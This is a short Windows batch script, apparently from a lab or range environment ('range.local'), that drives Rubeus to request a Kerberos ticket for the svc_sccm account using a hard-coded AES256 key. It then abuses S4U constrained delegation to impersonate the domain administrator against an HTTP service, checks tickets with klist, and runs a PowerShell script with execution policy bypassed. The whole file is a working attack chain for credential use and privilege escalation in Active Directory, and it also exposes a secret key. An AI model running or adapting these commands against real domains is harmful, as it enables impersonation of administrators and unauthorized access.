@echo off
set RB=C:\Tools\ADTools\Rubeus.exe
set K=C:\Windows\Temp\svc_sccm_tgt.kirbi
echo === ASKTGT ===
%RB% asktgt /user:svc_sccm /aes256:54D4BFDC9CD3B8885E6EEE6AA2AC04058C80D57D13EA70708CF7ABECB1927012 /domain:range.local /dc:dc03.range.local /ptt /nowrap /outfile:%K% 1>nul 2>&1
echo === S4U ===
%RB% s4u /ticket:%K% /impersonateuser:administrator /msdsspn:HTTP/mbr02.range.local /dc:dc03.range.local /ptt /nowrap 1>nul 2>&1
echo === KLIST ===
klist
echo === IWR TEST ===
powershell -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\sccm-cd-iwr.ps1
echo === IWR_DONE ===
